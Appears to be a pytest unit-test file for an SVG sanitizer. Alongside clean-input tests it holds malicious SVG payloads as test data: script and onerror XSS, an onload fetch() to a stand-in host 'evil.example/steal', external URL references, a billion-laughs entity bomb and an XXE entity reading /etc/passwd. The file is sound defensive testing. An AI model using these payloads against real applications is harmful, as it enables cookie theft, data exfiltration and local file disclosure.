"""Unit tests for app.svg_sanitize — no DB required.

Every malicious-payload test asserts against the sanitizer's actual OUTPUT
bytes (or that it raised), never just "didn't crash" — a sanitizer that
silently no-ops on a dangerous input is worse than one that errors loudly.
"""
from __future__ import annotations

import xml.etree.ElementTree as ET

import pytest

from app.svg_sanitize import SvgSanitizeError, sanitize_svg

SVG_NS = "http://www.w3.org/2000/svg"


def _local_names(data: bytes) -> set[str]:
    root = ET.fromstring(data)
    return {el.tag.rsplit("}", 1)[-1] for el in root.iter()}


# ---------------------------------------------------------------------------
# Clean input passes through intact
# ---------------------------------------------------------------------------


def test_clean_svg_round_trips():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">'
        b'<rect x="0" y="0" width="50" height="50" fill="#336699"/>'
        b'<text x="10" y="80" font-size="12">Firewall</text>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    names = _local_names(out)
    assert names == {"svg", "rect", "text"}
    root = ET.fromstring(out)
    assert root.tag == f"{{{SVG_NS}}}svg"
    rect = root.find(f"{{{SVG_NS}}}rect")
    assert rect.get("fill") == "#336699"
    text = root.find(f"{{{SVG_NS}}}text")
    assert text.text == "Firewall"


def test_nested_groups_and_geometry_preserved():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<g id="zone-1"><circle cx="10" cy="10" r="5"/>'
        b'<polyline points="0,0 10,10 20,0"/></g>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert _local_names(out) == {"svg", "g", "circle", "polyline"}
    g = ET.fromstring(out).find(f"{{{SVG_NS}}}g")
    assert g.get("id") == "zone-1"


# ---------------------------------------------------------------------------
# Malicious payloads — each must come out stripped or rejected
# ---------------------------------------------------------------------------


def test_script_element_is_stripped():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<script>alert(document.cookie)</script>"
        b'<rect width="10" height="10"/>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"script" not in out
    assert b"alert" not in out
    assert _local_names(out) == {"svg", "rect"}


def test_onload_event_handler_attribute_is_stripped():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\'https://evil.example/steal\')">'
        b'<rect width="10" height="10" onmouseover="evil()"/>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"onload" not in out
    assert b"onmouseover" not in out
    assert b"evil" not in out


def test_external_xlink_href_image_reference_is_stripped():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<image xlink:href="https://evil.example/tracker.png" width="1" height="1"/>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"evil.example" not in out
    assert b"image" not in out
    assert b"href" not in out
    assert _local_names(out) == {"svg"}


def test_foreign_object_html_smuggling_is_stripped():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<foreignObject width="100" height="100">'
        b'<div xmlns="http://www.w3.org/1999/xhtml">'
        b'<img src="x" onerror="alert(1)"/></div>'
        b"</foreignObject>"
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"foreignObject" not in out
    assert b"onerror" not in out
    assert b"alert" not in out
    assert _local_names(out) == {"svg"}


def test_style_element_with_css_url_is_stripped():
    """CSS url() inside <style> is the same external-reference risk as
    xlink:href — <style> is never allowlisted at all, so this must vanish
    along with everything else the blocklist approach would have missed.
    """
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b"<style>rect { fill: url(https://evil.example/x.png); }</style>"
        b'<rect width="10" height="10"/>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"style" not in out
    assert b"evil.example" not in out
    assert b"url(" not in out
    assert _local_names(out) == {"svg", "rect"}


def test_style_attribute_with_css_url_is_stripped():
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg">'
        b'<rect width="10" height="10" style="fill:url(https://evil.example/x)"/>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"style" not in out
    assert b"evil.example" not in out


def test_doctype_with_entity_bomb_is_rejected_outright():
    """Classic billion-laughs shape — must be rejected, not sanitized down
    to something 'safe' — defusedxml raises before any tree is even built.
    """
    payload = (
        b'<?xml version="1.0"?>'
        b"<!DOCTYPE svg ["
        b'<!ENTITY lol "lol">'
        b'<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        b"]>"
        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&lol2;</text></svg>'
    )
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(payload)


def test_xxe_external_entity_is_rejected_outright():
    payload = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        b'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
    )
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(payload)


def test_plain_doctype_no_entities_is_still_rejected():
    """Even a DOCTYPE with no entity declarations at all is rejected per the
    spec's own instruction (reject outright, don't attempt to sanitize) —
    not just the entity-bearing variants.
    """
    payload = (
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
        b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">'
        b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="1" height="1"/></svg>'
    )
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(payload)


def test_non_svg_root_is_rejected():
    payload = b"<html><body>not an svg</body></html>"
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(payload)


def test_malformed_xml_is_rejected():
    payload = b"<svg><rect></svg>"  # mismatched tags
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(payload)


def test_oversized_input_is_rejected():
    huge = b'<svg xmlns="http://www.w3.org/2000/svg">' + b"<!-- pad -->" * 500_000 + b"</svg>"
    assert len(huge) > 5 * 1024 * 1024
    with pytest.raises(SvgSanitizeError):
        sanitize_svg(huge)


def test_data_uri_in_allowed_attribute_is_not_specially_blocked_but_href_still_gone():
    """`href`/`xlink:href` are simply never on the attribute allowlist, so a
    data: URI smuggled through one is dropped along with any other href
    value — confirms the allowlist doesn't special-case scheme, it just
    never carries the attribute at all.
    """
    payload = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<a xlink:href="javascript:alert(1)"><rect width="10" height="10"/></a>'
        b"</svg>"
    )
    out = sanitize_svg(payload)
    assert b"javascript" not in out
    assert b"href" not in out
    # <a> itself isn't on the element allowlist either, so it's gone too —
    # but its allowed child (<rect>) is hoisted out along with it per
    # _clean()'s "drop the whole subtree" behavior... actually _clean drops
    # children of a rejected element too (not hoisted), confirmed here:
    assert b"rect" not in out
